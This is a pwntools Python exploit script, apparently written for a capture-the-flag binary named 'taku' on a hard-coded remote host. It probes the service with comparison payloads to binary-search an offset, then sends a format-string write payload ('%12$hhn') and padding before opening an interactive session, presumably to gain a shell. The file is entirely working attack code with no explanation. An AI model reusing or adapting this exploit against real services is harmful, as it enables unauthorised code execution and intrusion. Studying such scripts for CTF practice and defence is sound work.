#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('taku')

host = args.HOST or '199.247.6.180'
port = int(args.PORT or 10009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()
print (io.recv())

offset = 0
N = 500000
left = 0x0
right = N * 2
while left + 1 < right:
    mid = (left + right) / 2
    num = mid - N

    if mid < 0:
        num = "{}".format(num)
    else:
        num = "+{}".format(num)

    log.info("L {} M {} R {}".format(left, mid, right))

    log.info ("Trying on {}".format(hex(mid)))

    # test for equality
    payload = "{}=@".format(num)
    log.info("Payload: {}".format(payload))
    io.sendline(payload)

    io.recvuntil('RESULT')
    result = int(io.recvline().strip())
    log.info("Result {}".format(result))

    if result:
        num = num.replace('+', '')
        offset = int(num)
        log.success("Found offset {}".format(num))
        break

    #print (io.recvline())

    # test for lower
    payload = "{}<@".format(num)
    log.info("Payload: {}".format(payload))
    io.sendline(payload)

    io.recvuntil('RESULT')
    result = int(io.recvline().strip())
    log.info("Result {}".format(result))

    #print (io.recvline())

    if result:
        # mid < target
        left = mid
    else:
        # mid > target
        right = mid

MAX_LEN = 32
offset += MAX_LEN - 1
io.sendline('+{}+0+0+0+0+0+0+0+0 %12$hhn'.format(offset))
io.recv()
io.send("A"*32)

io.interactive()

